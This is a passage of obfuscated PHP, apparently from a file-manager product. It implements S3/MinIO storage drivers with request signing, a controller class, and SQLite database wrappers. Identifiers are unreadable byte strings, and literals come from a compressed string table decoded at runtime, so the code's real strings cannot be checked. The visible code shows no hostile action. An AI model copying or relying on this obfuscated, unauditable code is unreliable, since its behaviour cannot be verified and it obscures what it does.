$–¼«©î„[32]); foreach ($÷‰¤ßè [$–¼«©î„[82]] as $‘ºùû¾) { if (is_string($‘ºùû¾)) { $¡‘Şƒá[$‘ºùû¾] = array($–¼«©î„[76] => 0); } } return $this->listAllFiles($ì‹á»’Æ, $¡‘Şƒá); } public function canRead($…¡Ò±ÜÃ) { $à¥È¬Çş =& $_SERVER[Ö†ØøÖ±]; $¬¾õ¿²Ä = $this->client->getAccessControlPolicy($this->bucket, $…¡Ò±ÜÃ); if (!$¬¾õ¿²Ä) { return !1; } return in_array($¬¾õ¿²Ä, array($à¥È¬Çş[225], $à¥È¬Çş[226], $à¥È¬Çş[227])) ? !0 : !1; } public function canWrite($Íç®•¼†) { $Ä¼¯™¼ =& $_SERVER[Ö†ØøÖ±]; $îÄ¹ŞËŸ = $this->client->getAccessControlPolicy($this->bucket, $Íç®•¼†); if (!$îÄ¹ŞËŸ) { return !1; } return in_array($îÄ¹ŞËŸ, array($Ä¼¯™¼[225], $Ä¼¯™¼[226])) ? !0 : !1; } public function getContent($òş­æ‚) { return $this->client->getObject($this->bucket, $òş­æ‚); } public function setContent($Œûá­Â, $‰×Å—Ä¸ = '', $îöªø¬… = false) { $Ì˜§©ª‚ =& $_SERVER[Ö†ØøÖ±]; $Œûá­Â = $îöªø¬… ? trim($Œûá­Â, $Ì˜§©ª‚[8]) . $Ì˜§©ª‚[8] : $Œûá­Â; $Ñ‚ú£ = get_file_mime(get_path_ext($Œûá­Â)); $‹æïÔ…ë = $this->client->putObject($‰×Å—Ä¸, $this->bucket, $Œûá­Â, $Ì˜§©ª‚[213], array(), $Ñ‚ú£); if (!$‹æïÔ…ë) { return !1; } if ($îöªø¬…) { return !0; } $this->cacheMethod(null, null); $‹æïÔ…ë = $this->copyFile($Œûá­Â, $Œûá­Â, array($Ì˜§©ª‚[228] => $‹æïÔ…ë[$Ì˜§©ª‚[218]])); return $‹æïÔ…ë ? !0 : !1; } public function fileSubstr($ÑêÊò÷Î, $Å‹œÓâ³, $Æ¹™â‡Ş) { $Úõ¤‰ö• = $Å‹œÓâ³ + $Æ¹™â‡Ş - 1; return $this->client->getObject($this->bucket, $ÑêÊò÷Î, array($_SERVER[Ö†ØøÖ±][229] => "\x62\171\x74\145\x73\x3d{$Å‹œÓâ³}\x2d{$Úõ¤‰ö•}")); } public function upload($šÜÜ‚¥, $ÉĞ„¢å, $âÜ¾û×å = false, $Üö”‚ÄÌ = REPEAT_REPLACE) { $´ßçÈˆ‹ =& $_SERVER[Ö†ØøÖ±]; $¯í’©çê = array($´ßçÈˆ‹[228] => @md5_file($ÉĞ„¢å)); $ğğñƒÁû = array($´ßçÈˆ‹[230] => get_file_mime(get_path_ext($šÜÜ‚¥))); if (IO::size($ÉĞ„¢å) <= 1024 * 1024 * 200) { $¥†Ê¦îË = $this->client->putObjectFile($ÉĞ„¢å, $this->bucket, $šÜÜ‚¥, $´ßçÈˆ‹[213], $¯í’©çê, $ğğñƒÁû); return !empty($¥†Ê¦îË) ? $this->getPathOuter($šÜÜ‚¥) : !1; } $Àºğø›‹ = $this->client->multiUploadObject($ÉĞ„¢å, $this->bucket, trim($šÜÜ‚¥, $´ßçÈˆ‹[8]), $¯í’©çê, $ğğñƒÁû); return $Àºğø›‹ ? $this->getPathOuter($šÜÜ‚¥) : !1; } public function download($°ˆË… ´, $î–îó‹) { if (!@is_dir($this->pathFather($î–îó‹)) && !IO::mkdir($this->pathFather($î–îó‹))) { return !1; } $Ë»÷€®± = $this->client->getObject($this->bucket, $°ˆË… ´, array(), $î–îó‹); return $Ë»÷€®± !== !1 ? $î–îó‹ : !1; } public function link($ö½®Š½£, $‚‚ú¦ = array()) { $Ú…‚œÉĞ =& $_SERVER[Ö†ØøÖ±]; if ($this->signVer == $Ú…‚œÉĞ[231]) { return $this->client->getAuthenticatedURL($this->bucket, $ö½®Š½£, 3600 * 12, $‚‚ú¦); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ö½®Š½£, $Ú…‚œÉĞ[8]), 3600 * 12, $this->region, array(), !0, $‚‚ú¦); } public function fileOut($ÂĞàŞæ¿, $¯‹ÈÅ¿ = false, $¿¾ü·«« = false, $ÓÀ²‡„— = '') { $Æ‰é­¨Û =& $_SERVER[Ö†ØøÖ±]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÂĞàŞæ¿, $¯‹ÈÅ¿, $¿¾ü·««, $ÓÀ²‡„—); } if (!$¿¾ü·««) { $¿¾ü·«« = $this->pathThis($ÂĞàŞæ¿); } $Üå¿ÜÜÊ = get_file_mime(get_path_ext($¿¾ü·««)); if ($Üå¿ÜÜÊ == $Æ‰é­¨Û[232]) { return parent::fileOut($ÂĞàŞæ¿, $¯‹ÈÅ¿, $¿¾ü·««, $ÓÀ²‡„—); } $šı÷ß = array($Æ‰é­¨Û[233] => $Üå¿ÜÜÊ); if ($¯‹ÈÅ¿) { $šı÷ß[$Æ‰é­¨Û[234]] = $Æ‰é­¨Û[235] . rawurlencode($¿¾ü·««); } else { } $û—Ï = $this->link($ÂĞàŞæ¿, $šı÷ß); $this->fileOutLink($û—Ï); } public function fileOutServer($ƒ½º¯É—, $óÑè½§ = false, $ÁœÆ´ËÂ = false, $¤ÀÁÉøô = '') { parent::fileOut($ƒ½º¯É—, $óÑè½§, $ÁœÆ´ËÂ, $¤ÀÁÉøô); } public function fileOutImageServer($•‰¡¬Å£, $·£‰Ù¨· = 250) { parent::fileOutImage($•‰¡¬Å£, $·£‰Ù¨·); } public function hashMd5($õ§ë„À„, $›‡™Õ–ä = '') { $™âªÁ¹ª =& $_SERVER[Ö†ØøÖ±]; $æÀõ‡ = $this->objectMeta($õ§ë„À„); if (!$æÀõ‡) { return !1; } $›‡™Õ–ä = $›‡™Õ–ä ? $›‡™Õ–ä : _get($æÀõ‡, $™âªÁ¹ª[236]); $›‡™Õ–ä = $›‡™Õ–ä ? $›‡™Õ–ä : _get($æÀõ‡, $™âªÁ¹ª[218], $™âªÁ¹ª[12]); return $›‡™Õ–ä; } public function uploadFormData($³Úá£×”, $¹î¢şĞÓ = 3600) { $ñíÆâ¼ =& $_SERVER[Ö†ØøÖ±]; $±’Ğ†ûÓ = $this->pathFather($³Úá£×”); $¥¬’Âº€ = $this->client->getHttpUploadPostParams($this->bucket, $±’Ğ†ûÓ, $ñíÆâ¼[213], $¹î¢şĞÓ); return array_merge((array) $¥¬’Âº€, array($ñíÆâ¼[196] => $this->getHost())); } public function multiUploadFormData($Ó¿«Éœå, $­ğâßå = 3600) { $ùâş‰¿Ÿ =& $_SERVER[Ö†ØøÖ±]; $ÒÌ¤ì¼° = gmdate($ùâş‰¿Ÿ[237]); $¿ä…—˜¼ = array(); $ğí»÷òÕ = $this->client->getUploadId($this->bucket, $Ó¿«Éœå, $¿ä…—˜¼); if (!$ğí»÷òÕ) { return !1; } return array($ùâş‰¿Ÿ[238] => $ğí»÷òÕ, $ùâş‰¿Ÿ[196] => $this->getHost() . $ùâş‰¿Ÿ[8] . $this->pathEncode($Ó¿«Éœå), $ùâş‰¿Ÿ[239] => $ÒÌ¤ì¼°, $ùâş‰¿Ÿ[94] => $Ó¿«Éœå); } public function multiUploadAuthData($¢•šÓò, $ö—Ñó® = array()) { $¦Ÿ±¯ˆ =& $_SERVER[Ö†ØøÖ±]; $»ˆ•‚íü = isset($ö—Ñó®[$¦Ÿ±¯ˆ[239]]) ? $ö—Ñó®[$¦Ÿ±¯ˆ[239]] : gmdate($¦Ÿ±¯ˆ[237]); $©À‚ˆ¬² = isset($ö—Ñó®[$¦Ÿ±¯ˆ[175]]) ? $ö—Ñó®[$¦Ÿ±¯ˆ[175]] : $¦Ÿ±¯ˆ[12]; $şÜ½ı = $ö—Ñó®[$¦Ÿ±¯ˆ[94]]; unset($ö—Ñó®[$¦Ÿ±¯ˆ[94]]); if (isset($ö—Ñó®[$¦Ÿ±¯ˆ[240]])) { $ö—Ñó®[$¦Ÿ±¯ˆ[239]] = $»ˆ•‚íü; return $this->listUploadParts($şÜ½ı, $ö—Ñó®); } $¸¸½˜ïí = array($¦Ÿ±¯ˆ[241], $¦Ÿ±¯ˆ[12], $¦Ÿ±¯ˆ[120], $¦Ÿ±¯ˆ[12], "\x78\x2d\141\x6d\x7a\x2d\144\141\164\x65\x3a{$»ˆ•‚íü}", $¦Ÿ±¯ˆ[8] . $this->bucket . $¦Ÿ±¯ˆ[8] . $this->pathEncode($şÜ½ı) . $©À‚ˆ¬²); if (strpos($©À‚ˆ¬², $¦Ÿ±¯ˆ[242]) === 0) { $¸¸½˜ïí[0] = $¦Ÿ±¯ˆ[243]; } if (isset($ö—Ñó®[$¦Ÿ±¯ˆ[244]]) && $ö—Ñó®[$¦Ÿ±¯ˆ[244]] == $¦Ÿ±¯ˆ[245]) { $¸¸½˜ïí[0] = $¦Ÿ±¯ˆ[245]; } $™×ƒ‘é = implode($¦Ÿ±¯ˆ[246], $¸¸½˜ïí); $øäÜµ›í = base64_encode(hash_hmac($¦Ÿ±¯ˆ[247], $™×ƒ‘é, $this->secret, !0)); $ÈÎôßõØ = $¦Ÿ±¯ˆ[248] . $this->accessKey . $¦Ÿ±¯ˆ[4] . $øäÜµ›í; if (strpos($©À‚ˆ¬², $¦Ÿ±¯ˆ[242]) === 0) { return array($¦Ÿ±¯ˆ[249] => $ÈÎôßõØ, $¦Ÿ±¯ˆ[239] => $»ˆ•‚íü); } return $ÈÎôßõØ; } public function listUploadParts($ã÷˜Ë—’, $òóìîğÕ = array()) { $°ë”Óˆ =& $_SERVER[Ö†ØøÖ±]; $ĞË¨ÒÛü = str_replace($°ë”Óˆ[250], $°ë”Óˆ[12], $òóìîğÕ[$°ë”Óˆ[175]]); $é€ËšÜê = $this->client->listParts($this->bucket, $ã÷˜Ë—’, $ĞË¨ÒÛü); if (!$é€ËšÜê) { return !1; } unset($òóìîğÕ[$°ë”Óˆ[240]], $òóìîğÕ[$°ë”Óˆ[244]]); $òóìîğÕ[$°ë”Óˆ[94]] = $ã÷˜Ë—’; $§ª¥µµÕ = $this->multiUploadAuthData($ã÷˜Ë—’, $òóìîğÕ); if (empty($§ª¥µµÕ)) { return !1; } return array($°ë”Óˆ[249] => $§ª¥µµÕ, $°ë”Óˆ[239] => $òóìîğÕ[$°ë”Óˆ[239]], $°ë”Óˆ[251] => $é€ËšÜê); } public function getHost() { return parent::getHost() . $_SERVER[Ö†ØøÖ±][8] . $this->bucket; } public function size($áÜÓÍúø) { $¯ËÎ¨ğ = $this->objectMeta($áÜÓÍúø); return $¯ËÎ¨ğ ? $¯ËÎ¨ğ[$_SERVER[Ö†ØøÖ±][76]] : 0; } public function info($Éâ²õ™ò) { if ($this->isFolder($Éâ²õ™ò)) { return $this->folderInfo($Éâ²õ™ò); } else { if ($this->isFile($Éâ²õ™ò)) { return $this->fileInfo($Éâ²õ™ò); } } return !1; } public function exist($ß²—Š) { return $this->isFile($ß²—Š) || $this->isFolder($ß²—Š); } public function isFile($˜ìşò™ˆ) { return !$this->isFolder($˜ìşò™ˆ) && $this->objectMeta($˜ìşò™ˆ); } public function isFolder($ÄòÉëŒ¥) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][166], $ÄòÉëŒ¥); } protected function objectMeta($àœ©›êÂ) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][168], $àœ©›êÂ); } protected function _objectMeta($ğò«ïü¡) { $ß‚½í‰ =& $_SERVER[Ö†ØøÖ±]; $ğò«ïü¡ = rtrim($ğò«ïü¡, $ß‚½í‰[8]); try { $¹œ„Ô¨ = $this->client->getObjectInfo($this->bucket, $ğò«ïü¡); if (!isset($¹œ„Ô¨[$ß‚½í‰[236]]) && isset($¹œ„Ô¨[$ß‚½í‰[252]])) { $¹œ„Ô¨[$ß‚½í‰[236]] = $¹œ„Ô¨[$ß‚½í‰[252]]; } } catch (Exception $æİ‡™ğ) { $¹œ„Ô¨ = !1; } if (!$¹œ„Ô¨) { } return $¹œ„Ô¨; } protected function _isFolder($ĞÌ†®­Ï) { $©¾Íö•‰ =& $_SERVER[Ö†ØøÖ±]; $ĞÌ†®­Ï = rtrim($ĞÌ†®­Ï, $©¾Íö•‰[8]); if ($ĞÌ†®­Ï == $©¾Íö•‰[12] || $ĞÌ†®­Ï == $©¾Íö•‰[8]) { return !0; } $‘¼åØ˜ = $this->client->getBucket($this->bucket, $ĞÌ†®­Ï, null, 1); if (empty($‘¼åØ˜[$©¾Íö•‰[220]])) { return !1; } $†¤®·èÍ = $‘¼åØ˜[$©¾Íö•‰[220]][0][$©¾Íö•‰[32]]; return stripos($†¤®·èÍ, $ĞÌ†®­Ï . $©¾Íö•‰[8]) === 0 ? !0 : !1; if (substr($†¤®·èÍ, -1) == $©¾Íö•‰[8]) { return !0; } if (get_path_this($†¤®·èÍ) == get_path_this($ĞÌ†®­Ï)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ñß÷Õ¬) { parent::__construct($Ñß÷Õ¬); $this->signatureVersion($_SERVER[Ö†ØøÖ±][231]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ÔË‹“Ô›, $ú“ÍÇó = 3600) { $ Ãé°‰Õ =& $_SERVER[Ö†ØøÖ±]; $¥½È…× = $ Ãé°‰Õ[213]; $˜Õ¿âå = $ Ãé°‰Õ[253]; $©Ø’»Äó = $ Ãé°‰Õ[62]; $¶­Î¥ßÛ = gmdate($ Ãé°‰Õ[254]); $íÇ¹˜èï = gmdate($ Ãé°‰Õ[255]); $µ—Ô¯ı÷ = $ Ãé°‰Õ[256]; $Ü½µÁäÇ = $ú“ÍÇó . $ Ãé°‰Õ[12]; $ÌŠ«Àñª = $ Ãé°‰Õ[257]; $¨ıèŠÇÜ = array($this->accessKey, $íÇ¹˜èï, $this->region, $©Ø’»Äó, $µ—Ô¯ı÷); $¡Ì Í½œ = implode($ Ãé°‰Õ[8], $¨ıèŠÇÜ); $“å“éşÏ = array($ Ãé°‰Õ[258] => gmdate($ Ãé°‰Õ[259], strtotime($ Ãé°‰Õ[260])), $ Ãé°‰Õ[261] => array(array($ Ãé°‰Õ[262] => $this->bucket), array($ Ãé°‰Õ[263] => $¥½È…×), array($ Ãé°‰Õ[264], $ Ãé°‰Õ[265], $ Ãé°‰Õ[12]), array($ Ãé°‰Õ[264], $ Ãé°‰Õ[266], $ Ãé°‰Õ[12]), array($ Ãé°‰Õ[264], $ Ãé°‰Õ[267], $ Ãé°‰Õ[12]), array($ Ãé°‰Õ[268] => $ÌŠ«Àñª), array($ Ãé°‰Õ[269] => $¡Ì Í½œ), array($ Ãé°‰Õ[270] => $˜Õ¿âå), array($ Ãé°‰Õ[271] => $¶­Î¥ßÛ), array($ Ãé°‰Õ[272] => $Ü½µÁäÇ))); $İ÷ ƒÆ” = base64_encode(json_encode($“å“éşÏ)); $µµ®Ëùˆ = hash_hmac($ Ãé°‰Õ[273], $íÇ¹˜èï, $ Ãé°‰Õ[274] . $this->secret, !0); $¿öÊõ = hash_hmac($ Ãé°‰Õ[273], $this->region, $µµ®Ëùˆ, !0); $ÅƒæŠîç = hash_hmac($ Ãé°‰Õ[273], $©Ø’»Äó, $¿öÊõ, !0); $ŒøÛ…Û• = hash_hmac($ Ãé°‰Õ[273], $µ—Ô¯ı÷, $ÅƒæŠîç, !0); $Şá£Ô˜ = hash_hmac($ Ãé°‰Õ[273], $İ÷ ƒÆ”, $ŒøÛ…Û•); $Ùè­®Ê¥ = array($ Ãé°‰Õ[230] => $ Ãé°‰Õ[12], $ Ãé°‰Õ[275] => $ Ãé°‰Õ[12], $ Ãé°‰Õ[263] => $¥½È…×, $ Ãé°‰Õ[268] => $ÌŠ«Àñª, $ Ãé°‰Õ[276] => $İ÷ ƒÆ”, $ Ãé°‰Õ[277] => $¡Ì Í½œ, $ Ãé°‰Õ[278] => $˜Õ¿âå, $ Ãé°‰Õ[279] => $¶­Î¥ßÛ, $ Ãé°‰Õ[280] => $Ü½µÁäÇ, $ Ãé°‰Õ[281] => $Şá£Ô˜, $ Ãé°‰Õ[196] => $this->getHost()); return $Ùè­®Ê¥; } } goto FÓ¸ÚÉ£«š; B§¡ó¡òæ¾: if (!$kvxczgjoyr) { die; } $_SERVER[â„ó¿‚å] = explode($_SERVER[Ö†ØøÖ±][658], gzinflate(substr($_SERVER[Ö†ØøÖ±][659], 10, -8))); $ylvdewaqco = $_SERVER[Ö†ØøÖ±][660]; goto e©œ¡ïÓÎ; dã©†Ïäø: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¾ÂÏ¥ôû =& $_SERVER[Ö†ØøÖ±]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¾ÂÏ¥ôû[6]] =& $config; $this->values[$¾ÂÏ¥ôû[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¾ÂÏ¥ôû[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Å°ìòõ­) { if (1 === func_num_args()) { $this->{$Å°ìòõ­} = new $Å°ìòõ­(); } else { $µµöú¤£ = new ReflectionClass($Å°ìòõ­); $üşİ«¯ = func_get_args(); array_shift($üşİ«¯); $this->{$Å°ìòõ­} = $µµöú¤£->newInstanceArgs($üşİ«¯); } return $this->{$Å°ìòõ­}; } public function routeBind($ùÕÆóêİ, $ƒùÚä‹Œ, $âì¬œ¨¾ = 3) { $ÎÕÄ©¥• =& $_SERVER[Ö†ØøÖ±]; $óØ×ÃÎ = $this->in[$ÎÕÄ©¥•[9]]; $ùÕÆóêİ = str_replace($ÎÕÄ©¥•[10], $ÎÕÄ©¥•[11], trim(trim($ùÕÆóêİ, $ÎÕÄ©¥•[8]), $ÎÕÄ©¥•[12])); if (!$ùÕÆóêİ || count($óØ×ÃÎ) <= $âì¬œ¨¾) { return !1; } $ªÎ¥Òä = !0; $¨ØÀª§† = explode($ÎÕÄ©¥•[8], $ùÕÆóêİ); for ($ÈšÛ˜òÅ = 0; $ÈšÛ˜òÅ < count($¨ØÀª§†); $ÈšÛ˜òÅ++) { if ($¨ØÀª§†[$ÈšÛ˜òÅ] != $óØ×ÃÎ[$âì¬œ¨¾ + $ÈšÛ˜òÅ]) { $ªÎ¥Òä = !1; break; } } if (!$ªÎ¥Òä) { return; } call_user_func_array(array($this, $ƒùÚä‹Œ), array()); } public function routeArgs($»Ï‰İËÃ = 3) { $Â”Ã¤ı  = $this->in[$_SERVER[Ö†ØøÖ±][9]]; if (count($Â”Ã¤ı ) <= $»Ï‰İËÃ) { return array(); } $½Ï´ôš× = array(); for ($öôÌ¸ğ« = $»Ï‰İËÃ; $öôÌ¸ğ« < count($Â”Ã¤ı ); $öôÌ¸ğ« += 2) { $½Ï´ôš×[$Â”Ã¤ı [$öôÌ¸ğ«]] = $Â”Ã¤ı [$öôÌ¸ğ« + 1]; $this->in[$Â”Ã¤ı [$öôÌ¸ğ«]] = $Â”Ã¤ı [$öôÌ¸ğ« + 1]; } return $½Ï´ôš×; } protected function assign($Á­º“‚Ä, $Â×µÈÒÂ) { $this->values[$Á­º“‚Ä] = $Â×µÈÒÂ; } protected function display($Óà˜Ê—Ò) { ob_end_clean(); extract($this->values); require $this->tpl . $Óà˜Ê—Ò; } } class DbSqliteBase extends Db { public function __construct($¦û¥ø = '') { $éßÕœÓª =& $_SERVER[Ö†ØøÖ±]; if (!extension_loaded($éßÕœÓª[13])) { think_exception(think_lang($éßÕœÓª[14]) . $éßÕœÓª[15]); } if (!empty($¦û¥ø)) { if (!isset($¦û¥ø[$éßÕœÓª[16]])) { $¦û¥ø[$éßÕœÓª[16]] = 438; } $this->config = $¦û¥ø; if (empty($this->config[$éßÕœÓª[17]])) { $this->config[$éßÕœÓª[17]] = array(); } } } public function connect($šç«‡®× = '', $¿¶èÉª = 0) { $µ”ñ§‚¹ =& $_SERVER[Ö†ØøÖ±]; if (!isset($this->linkID[$¿¶èÉª])) { if (empty($šç«‡®×)) { $šç«‡®× = $this->config; } $çëßÔô• = !empty($šç«‡®×[$µ”ñ§‚¹[17]][$µ”ñ§‚¹[18]]) ? $šç«‡®×[$µ”ñ§‚¹[17]][$µ”ñ§‚¹[18]] : $this->pconnect; $›ÑÖÑ§ = $çëßÔô• ? $µ”ñ§‚¹[19] : $µ”ñ§‚¹[20]; $this->linkID[$¿¶èÉª] = $›ÑÖÑ§($šç«‡®×[$µ”ñ§‚¹[21]], $šç«‡®×[$µ”ñ§‚¹[16]]); if (!$this->linkID[$¿¶èÉª]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¿¶èÉª], 30000); if (1 != think_config($µ”ñ§‚¹[22])) { unset($this->config); } } return $this->linkID[$¿¶èÉª]; } public function free() { $this->queryID = null; } public function query($í°Š¿ß¶) { $èŠÅ±Ï =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $í°Š¿ß¶; if ($this->queryID) { $this->free(); } think_action_status($èŠÅ±Ï[23], 1); think_status($èŠÅ±Ï[24]); $this->queryID = sqlite_query($this->_linkID, $í°Š¿ß¶); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $î×ã«û• = $this->getAll(); return $î×ã«û•; } } public function execute($Ò“öğ½³) { $®û£›®Á =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ò“öğ½³; if ($this->queryID) { $this->free(); } think_action_status($®û£›®Á[25], 1); think_status($®û£›®Á[24]); $ø­©œ²Å = sqlite_exec($this->_linkID, $Ò“öğ½³); $this->debug(); if (!1 === $ø­©œ²Å) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ö†ØøÖ±][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $é¢çÏÔÓ = sqlite_query($this->_linkID, $_SERVER[Ö†ØøÖ±][27]); if (!$é¢çÏÔÓ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $±®£êÆ = sqlite_query($this->_linkID, $_SERVER[Ö†ØøÖ±][28]); if (!$±®£êÆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¨ˆİ†Şø = array(); if ($this->numRows > 0) { for ($Æ¼Ï¢¬ = 0; $Æ¼Ï¢¬ < $this->numRows; $Æ¼Ï¢¬++) { $¨ˆİ†Şø[$Æ¼Ï¢¬] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¨ˆİ†Şø; } public function getFields($Ÿ€Ğò¬Ó) { $¨Şµ³³” =& $_SERVER[Ö†ØøÖ±]; $á—‹½ ü = $this->query($¨Şµ³³”[29] . $Ÿ€Ğò¬Ó . $¨Şµ³³”[30]); $‚ì÷‰ëÃ = array(); if ($á—‹½ ü) { foreach ($á—‹½ ü as $Œ‰»¾Ğ‰ => $¹·ŞƒÂ³) { $‚ì÷‰ëÃ[$¹·ŞƒÂ³[$¨Şµ³³”[31]]] = array($¨Şµ³³”[32] => $¹·ŞƒÂ³[$¨Şµ³³”[31]], $¨Şµ³³”[33] => $¹·ŞƒÂ³[$¨Şµ³³”[34]], $¨Şµ³³”[35] => (bool) ($¹·ŞƒÂ³[$¨Şµ³³”[36]] === $¨Şµ³³”[12]), $¨Şµ³³”[37] => $¹·ŞƒÂ³[$¨Şµ³³”[38]], $¨Şµ³³”[39] => strtolower($¹·ŞƒÂ³[$¨Şµ³³”[40]]) == $¨Şµ³³”[41], $¨Şµ³³”[42] => strtolower($¹·ŞƒÂ³[$¨Şµ³³”[43]]) == $¨Şµ³³”[44]); } } return $‚ì÷‰ëÃ; } public function getTables($“çåû˜£ = '') { $¾É¬áøĞ =& $_SERVER[Ö†ØøÖ±]; $ ×©ü·¥ = $this->query($¾É¬áøĞ[45] . $¾É¬áøĞ[46] . $¾É¬áøĞ[47]); $É“ûµ« = array(); foreach ($ ×©ü·¥ as $Ùö¼íò„ => $ëçç”şÌ) { $É“ûµ«[$Ùö¼íò„] = current($ëçç”şÌ); } return $É“ûµ«; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ó²İÄù¥ =& $_SERVER[Ö†ØøÖ±]; $öäµ­ìå = sqlite_last_error($this->_linkID); $this->error = $öäµ­ìå . $Ó²İÄù¥[4] . sqlite_error_string($öäµ­ìå); if ($Ó²İÄù¥[12] != $this->queryStr) { $this->error .= LNG($Ó²İÄù¥[48]) . $this->queryStr; } think_trace($this->error, $Ó²İÄù¥[12], $Ó²İÄù¥[49]); return $this->error; } public function escapeString($Í­è˜¼¨) { return sqlite_escape_string($Í­è˜¼¨); } public function parseLimit($»¸ÏªØ›) { $¼­Ñ ¢ =& $_SERVER[Ö†ØøÖ±]; $¦”¥…ğï = $¼­Ñ ¢[12]; if (!empty($»¸ÏªØ›)) { $»¸ÏªØ› = explode($¼­Ñ ¢[50], $»¸ÏªØ›); if (count($»¸ÏªØ›) > 1) { $¦”¥…ğï .= $¼­Ñ ¢[51] . $»¸ÏªØ›[1] . $¼­Ñ ¢[52] . $»¸ÏªØ›[0] . $¼­Ñ ¢[53]; } else { $¦”¥…ğï .= $¼­Ñ ¢[51] . $»¸ÏªØ›[0] . $¼­Ñ ¢[53]; } } return $¦”¥…ğï; } } class DbSqlite3Base extends Db { public function __construct($ñŒÏŒ‰– = '') { $‘“”Åù =& $_SERVER[Ö†ØøÖ±]; if (!class_exists($‘“”Åù[54])) { think_exception(think_lang($‘“”Åù[14]) . $‘“”Åù[55]); } if (!empty($ñŒÏŒ‰–)) { if (!isset($ñŒÏŒ‰–[$‘“”Åù[16]])) { $ñŒÏŒ‰–[$‘“”Åù[16]] = 438; } $this->config = $ñŒÏŒ‰–; if (empty($this->config[$‘“”Åù[17]])) { $this->config[$‘“”Åù[17]] = array(); } } } public function connect($èöŠ³•¤ = '', $–‰Ö±³ = 0) { $Ô³¤£½Ş =& $_SERVER[Ö†ØøÖ±]; if (!isset($this->linkID[$–‰Ö±³])) { if (empty($èöŠ³•¤)) { $èöŠ³•¤ = $this->config; } $this->linkID[$–‰Ö±³] = new SQLite3($èöŠ³•¤[$Ô³¤£½Ş[21]]); if (!$this->linkID[$–‰Ö±³]) { think_exception($this->linkID[$–‰Ö±³]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$–‰Ö±³]->busyTimeout(30000); if (1 != think_config($Ô³¤£½Ş[22])) { unset($this->config); } } return $this->linkID[$–‰Ö±³]; } public function free() { $this->queryID = null; } public function query($ÜÒÏë—©) { $—¢ŒÅÍÏ =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÜÒÏë—©; if ($this->queryID) { $this->free(); } think_action_status($—¢ŒÅÍÏ[23], 1); think_status($—¢ŒÅÍÏ[24]); $this->queryID = $this->_linkID->query($ÜÒÏë—©); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÇûÊğœÙ = $this->getAll(); $this->numRows = count($ÇûÊğœÙ); return $ÇûÊğœÙ; } } public function execute($Î„ïàøÅ) { $ÄÕ„àÒ– =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Î„ïàøÅ; if ($this->queryID) { $this->free(); } think_action_status($ÄÕ„àÒ–[25], 1); think_status($ÄÕ„àÒ–[24]); $óôÒªç = $this->_linkID->exec($Î„ïàøÅ); $this->debug(); if (!1 === $óôÒªç) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ö†ØøÖ±][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $™®¯ï±ì = $this->_linkID->query($_SERVER[Ö†ØøÖ±][27]); if (!$™®¯ï±ì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $õßçÒ‹– = $this->_linkID->query($_SERVER[Ö†ØøÖ±][28]); if (!$õßçÒ‹–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $µóØ¢’ = array(); while ($¯ØñÃê» = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $µóØ¢’[] = $¯ØñÃê»; } $this->queryID->reset(); return $µóØ¢’; } public function getFields($éä€á‰Ê) { $ùİŒ§†¥ =& $_SERVER[Ö†ØøÖ±]; $¶ºÇóÎ = $this->query($ùİŒ§†¥[29] . $éä€á‰Ê . $ùİŒ§†¥[30]); $ˆ»ÆïÁ‰ = array(); if ($¶ºÇóÎ) { foreach ($¶ºÇóÎ as $¦á­¼ => $÷ãó—û‹) { $ˆ»ÆïÁ‰[$÷ãó—û‹[$ùİŒ§†¥[32]]] = array($ùİŒ§†¥[32] => $÷ãó—û‹[$ùİŒ§†¥[32]], $ùİŒ§†¥[33] => $÷ãó—û‹[$ùİŒ§†¥[33]], $ùİŒ§†¥[35] => (bool) ($÷ãó—û‹[$ùİŒ§†¥[35]] === $ùİŒ§†¥[12]), $ùİŒ§†¥[37] => $÷ãó—û‹[$ùİŒ§†¥[56]], $ùİŒ§†¥[39] => (bool) $÷ãó—û‹[$ùİŒ§†¥[57]], $ùİŒ§†¥[42] => (bool) 